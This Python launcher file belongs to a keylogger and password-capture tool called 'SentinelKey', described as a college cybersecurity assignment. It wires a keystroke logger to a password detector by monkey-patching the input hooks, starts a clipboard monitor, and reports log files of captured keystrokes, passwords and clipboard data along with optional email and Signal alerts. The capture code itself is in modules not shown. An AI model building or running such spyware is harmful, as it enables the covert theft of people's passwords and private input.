"""
main.py — SentinelKey combined launcher.

Runs Part 1 (sentinel_key.py) and Part 2 (password_sniffer.py) together.
Part 1's keyboard and mouse callbacks are monkey-patched to also forward
every event to the Part 2 detector so both parts share a single input stream.

Usage
─────
    python main.py

College cybersecurity assignment — run only on systems you own.
"""

import os
import sys
from datetime import datetime

# Ensure the project directory is importable
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import config
import sentinel_key
from password_sniffer import PasswordDetector


def _splash() -> None:
    w = 62
    print("╔" + "═" * w + "╗")
    print("║" + "  SentinelKey — Keystroke & Password Capture".center(w) + "║")
    print("╠" + "═" * w + "╣")
    print(f"║  Started      : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}".ljust(w + 1) + "║")
    print(f"║  Part 1 log   : {config.KEYLOG_FILE}".ljust(w + 1) + "║")
    print(f"║  Part 2 log   : {config.PASSWORDS_FILE}".ljust(w + 1) + "║")
    print(f"║  Clipboard log: {config.CLIPBOARD_FILE}".ljust(w + 1) + "║")
    print(f"║  Start mode   : {'Wait for ESC' if config.START_ON_ESC else 'Immediate'}".ljust(w + 1) + "║")
    print(f"║  Stop key     : {config.STOP_KEY.upper()}".ljust(w + 1) + "║")
    print(f"║  Email alerts : {'ON' if config.EMAIL_ENABLED else 'OFF (set EMAIL_ENABLED=True in config.py)'}".ljust(w + 1) + "║")
    print(f"║  Signal alerts: {'ON' if config.SIGNAL_ENABLED else 'OFF (set SIGNAL_ENABLED=True in config.py)'}".ljust(w + 1) + "║")
    print("╚" + "═" * w + "╝\n")


def main() -> None:
    _splash()

    # Initialise the password detector (creates passwords_captured.txt)
    detector = PasswordDetector()

    # ── Monkey-patch Part 1 to also feed Part 2 ──────────────────────────────
    # Key events
    sentinel_key.on_key_event_hook = detector.process_key

    # Mouse events
    sentinel_key.on_mouse_event_hook = detector.on_mouse_event

    # Start the detector (clipboard monitor + its own listener for Ctrl tracking)
    detector.start()

    # Run Part 1 — this blocks until the user presses ESC / closes the GUI
    try:
        sentinel_key.main()
    except KeyboardInterrupt:
        print("\n[SYSTEM] Ctrl+C received — shutting down...")
    finally:
        detector.stop()

    print("\n╔══════════════════════════════════════════╗")
    print("║  SentinelKey — Session complete           ║")
    print(f"║  Part 1 log : {config.KEYLOG_FILE:<27}║")
    print(f"║  Part 2 log : {config.PASSWORDS_FILE:<27}║")
    print("╚══════════════════════════════════════════╝")


if __name__ == "__main__":
    main()
